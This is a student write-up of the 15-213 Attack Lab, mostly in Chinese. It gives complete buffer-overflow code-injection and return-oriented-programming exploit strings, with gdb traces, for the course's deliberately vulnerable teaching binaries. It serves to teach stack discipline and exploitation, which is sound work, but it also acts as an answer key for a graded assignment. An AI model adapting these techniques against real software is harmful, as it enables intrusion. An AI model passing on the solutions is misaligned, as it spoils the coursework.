## 实验说明
Note: This is the 64-bit successor to the 32-bit Buffer Lab. Students are given a pair of unique custom-generated x86-64 binary executables, called targets, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.

## 实验准备
注意自己运行的话，要加上--q选项。
gdb 设置参数

```
(gdb) set args -q
```

查看断点
```
(gdb) i breakpoints
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x00000000004011ad in main at main.c:97
        breakpoint already hit 1 time
3       breakpoint     keep y   0x0000000000401351 in main at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
```

### 注入式攻击
首先，进行注入式攻击的前提是了解过程调用时堆栈的变化过程。

将控制从函数P转移到函数Q时，需要简单地把程序计数器(PC)设置为Q的代码的起始位置。不过，当稍后从Q返回的时候，处理器必须记录好它需要继续P的执行的代码位置。在x86-64机器中，这个信息是用指令```call Q```调用Q来记录的。call指令将当前的指令地址A压入栈中，并将PC设置为Q的起始位置。压入堆栈中的地址A被称为返回地址，是紧跟在call指令后面那条指令的地址。对应的指令ret会从栈中弹出地址A，并把PC设置为A。

所以注入式攻击的实质，就是输入的字符串长度超过了缓存区的长度，并把rsp栈中的返回地址给覆盖掉，这样就可以操控程序被攻击代码所接管。

### 面向返回的攻击

## 实验过程
### phase_1
#### phase_1实验过程
首先，我们进入test函数，并运行至调用```getbuf```函数前。在调用之前，首先我们检查一下rsp处栈的内容:
```
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
=> 0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    retq
End of assembler dump.

(gdb) disass
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
=> 0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    retq
End of assembler dump.
(gdb) x/16xw $rsp
0x5561dca8:     0x00000002      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
0x5561dcc8:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
0x5561dcd8:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
```
然后，我们si进入```getbuf```函数，并检查此时堆栈的值，可以看到调用前的地址0x0040197已经入栈:
```
(gdb) disass
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
(gdb) x/16xw $rsp
0x5561dca0:     0x00401976      0x00000000      0x00000002      0x00000000
0x5561dcb0:     0x00401f24      0x00000000      0x00000000      0x00000000
0x5561dcc0:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
0x5561dcd0:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
```
缓存区的大小被设置为0x28,也就是当我们输入的数据超过这个范围后，就可以改写返回地址了。这里要注意，栈的增长方向是向下的，同时我们的数据是小端法表示的，所以对于touch_1的地址，我们输入字符串的末尾字符应为00 c0 17 40。通过实验提供的工具函数，我们得到我们攻击字符的表达
```
xxxx(40个字符)004017c0
```
这里用shell来生成这串字符，顺便练了练shell脚本
```
echo -ne '' > exploit.txt; for i in {1..10}; do echo -ne '63 63 63 63 ' >> exploit.txt; done; echo -ne 'c0 17 40 00' >> exploit.txt;
./hex2raw < exploit.txt > exploit_raw.txt
./ctarget -q -i exploit_raw.txt
```

#### phase_1实验结果
```
./ctarget -q -i exploit_raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 C0 17 40 00
```

### phase_2
#### phase_2的实验过程
Some Advice:
• You will want to position a byte representation of the address of your injected code in such a way that
ret instruction at the end of the code for getbuf will transfer control to it.
• Recall that the first argument to a function is passed in register %rdi.
• Your injected code should set the register to your cookie, and then use a ret instruction to transfer
control to the first instruction in touch2.
• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
control, even when you are not returning from a call.
• See the discussion in Appendix B on how to use tools to generate the byte-level representations of
instruction sequences.

发现cookie字段被存放在0x59b997fa处,放在rdx寄存器中

结合材料中的建议，我们设置攻击代码的表示为
```
mov $0x59b997fa, $rdi
ret 
```
转换为机器码
```
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq
```
我们将这段代码放在缓存区栈顶，同时利用溢出攻击覆盖掉返回地址
```
48 c7 c7 fa 97 b9 59 c3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 dc 61 55
```
同时，由于我们还需要返回到touch2函数，所以我们要延长攻击字符串长度，覆盖掉下一个返回地址。也就是当我们执行攻击代码的retq时，可以回到touch2函数中。
```
48 c7 c7 fa 97 b9 59 c3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00
```

#### phase_2实验结果
实验结果，通过了
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00 
```

### phase_3
#### phase_3的实验过程
实验三的解决方法类似于实验二，我们将输入的字符串放置在控制代码之前，注入攻击的代码形式为
```
   <cookie(59b997fa)>: 35 39 62 39 39 37 66 61
   <eol> 00 00 00 00 00 00 00 00
   0:	bf 78 dc 61 55       	mov    $0x5561dc78,%edi
   5:	c3                   	retq

```
然后我们需要修改，溢出攻击的第一个返回地址为mov指令所在位置；同时，由于我们还需要返回到touch3函数，所以我们还要利用溢出攻击覆盖掉返回地址。
```
35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 bf 78 dc 61 55 c3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00
```
#### phase_3实验结果
最后成功通过这个测试
```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 BF 78 DC 61 55 C3 00 00 00 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 88 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
```

### phase_4
#### phase_4的实验过程
面向返回的攻击方式，主要有两大限制，这里我们选取gadget(小器具)。
```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
// 0x90 : nop
// popq rax : 58
```
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq
// movq rax, rdi:48 89 c7
```
0x4019cc(gadget1 + 3)
0x59b997fa(cookie字符用于popq)
0x4019a2(gadget2 + 2)
0x4017ec(touch2)
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00(touch2)

#### phase_4的实验结果
实验结果
```
./rtarget -q -i exploit_raw.txt 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```
0x4019cc(gadget1 + 3)
0x59b997fa(cookie字符用于popq)
0x4019a2(gadget2 + 2)
0x4017ec(touch2)
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00(touch2)

### phase_5
#### phase_5的实验过程
在这个实验中，我们使用到的gadgets
```
// gadget1 pop
// 0x90 : nop
// popq rax : 58
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

// gadget2 
// movq rax, rdi:48 89 c7
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

// gadget3
// movq rsp, rax: 48 89 e0
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

// gadget4
// movl edx, ecx : 89 d1
// cmpb : 38 c9
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   
 
// gadget5
// movl ecx, esi:89 ce
// nop : 90
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq  

// gadget6
// movl eax, edx:89 ce
// nop : 90
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   
```

然后，我们还需要稍微修改下入口地址
```
gadget1 004019ca + 2 = 004019cc
gadget2 004019a0 + 2 = 004019a2
gadget3 00401a03 + 3 = 00401a06
gadget4 00401a33 + 1 = 00401a34
gadget5 00401a11 + 2 = 00401a13
gadget6 004019db + 2 = 004019dd
```

<!-- gadget1 -->
然后我们对这些gadget进行组装，组装方式为以下的形式；
```
gadget3 00401a06
<rdi = rsp>
gadget2 004019a2 movq rsp, rax
gadget1 004019cc movq rax, rdi
offset  00000048 popq rax
gadget6 004019dd movl eax, edx
gadget4 00401a34 movl edx, ecx
gadget5 00401a13 movl ecx, esi
add_xy  004019d6
gadget2 004019a2
touch3
35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00(cookie的string表示)
```
改写完机器代码如下:
```
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
```

#### phase_5的实验结果
Continuing.
```
./rtarget -q -i exploit_raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
```